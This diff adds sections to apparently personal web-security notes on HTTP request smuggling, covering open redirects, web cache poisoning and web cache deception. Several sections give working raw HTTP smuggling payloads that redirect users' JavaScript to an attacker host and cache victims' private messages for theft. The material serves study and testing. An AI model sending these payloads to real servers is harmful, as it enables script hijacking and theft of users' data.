@@ -16,6 +16,11 @@ HTTP request smuggling is a server-side attack that takes advantage of discrepan
     - [Revealing front-end request rewriting](#revealing-front-end-request-rewriting)
     - [Bypassing client authentication](#bypassing-client-authentication)
     - [Capturing other users' requests](#capturing-other-users-requests)
+    - [Using HTTP request smuggling to exploit reflected XSS](#using-http-request-smuggling-to-exploit-reflected-xss)
+    - [Using HTTP request smuggling to turn an on-site redirect into an open redirect](#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)
+    - [Perfom web cache poisoning](#perfom-web-cache-poisoning)
+    - [Perform web cache deception](#perform-web-cache-deception)
+
 
 ## Explanation
 
@@ -378,6 +383,171 @@ Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
 ... 
 ```
 
+### Using HTTP request smuggling to exploit reflected XSS
+
+[-> explanation here](/web/client-side/xss/xss.md#using-http-request-smuggling)
+
+### Using HTTP request smuggling to turn an on-site redirect into an open redirect
+
+Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:
+
+```
+GET /home HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/
+```
+
+This behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. For example:
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+```
+
+The smuggled request will trigger a redirect to the attacker's website, which will affect the next user's request that is processed by the back-end server. For example:
+
+```
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /scripts/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+
+Here, the user's request was for a JavaScript file that was imported by a page on the web site. The attacker can fully compromise the victim user by returning their own JavaScript in the response.
+
+### Perfom web cache poisoning
+
+If any part of the front-end infrastructure performs caching of content (generally for performance reasons), then it might be possible to poison the cache with the off-site redirect response. This will make the attack persistent, affecting any user who subsequently requests the affected URL.
+
+- First : find and control a redirect URL with smuggling request:
+
+Example:
+
+`/post/next?postId=2` -> redirect to `/post?postId=2`, so if i inject a host to `/post/next?postId=2` request, it gonna build a response : `http://exploit-server/post?postId=2`
+
+```
+POST / HTTP/1.1
+Host: vuln.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=2 HTTP/1.1
+Host: exploit-server.net
+Content-Length: 3
+
+x=
+```
+
+- Second step is to find a file requested which performs caching of content:
+
+example: `<script type="text/javascript" src="/resources/js/tracking.js"></script>`
+
+This request respond 
+
+```
+HTTP/2 200 OK
+...
+Cache-Control: max-age=30
+Age: 0
+...
+```
+
+Where age is the time which the file is stored in the cache and returned when we perform a get request to the file.
+
+- Step 3: send the smuggling request to perfom a redirection to our file stocked on our exploit server. Then submit a request to the javascript file stored 30 seconds:
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 59
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=2 HTTP/1.1
+Host: exploit-0ab100e5032243cb810a2e360137006f.exploit-server.net
+Content-Length: 10
+
+x=
+```
+
+Poisoined request:
+
+```
+GET /post/next?postId=2 HTTP/1.1
+Host: attacker-website.com
+Content-Length: 10
+
+x=GET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
+
+The smuggled request reaches the back-end server, which responds as before with the off-site redirect. The front-end server caches this response against what it believes is the URL in the second request, which is /static/include.js:
+
+From this point onwards, when other users request this URL, they receive the redirection to the attacker's web site.
+
+### Perform web cache deception
+
+Diff between cache poisoning and deception:
+
+- In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
+- In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.
+
+In this variant, the attacker smuggles a request that returns some sensitive user-specific content. For example:
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 43
+Transfer-Encoding: chunked
+
+0
+
+GET /private/messages HTTP/1.1
+foo: 
+```
+
+poisoning request:
+
+```
+GET /private/messages HTTP/1.1
+Foo: GET /static/some-image.png HTTP/1.1
+Host: vulnerable-website.com
+Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
+...
+```
+
+The back-end server responds to this request in the normal way. The URL in the request is for the user's private messages and the request is processed in the context of the victim user's session. The front-end server caches this response against what it believes is the URL in the second request, which is /static/some-image.png:
+
+```
+GET /static/some-image.png HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 200 Ok
+...
+<h1>Your private messages</h1>
+...
+```
+
+The attacker then visits the static URL and receives the sensitive content that is returned from the cache.
+
+An important caveat here is that the attacker doesn't know the URL against which the sensitive content will be cached, since this will be whatever URL the victim user happened to be requesting when the smuggled request took effect. The attacker might need to fetch a large number of static URLs to discover the captured content.
 
 ---
 
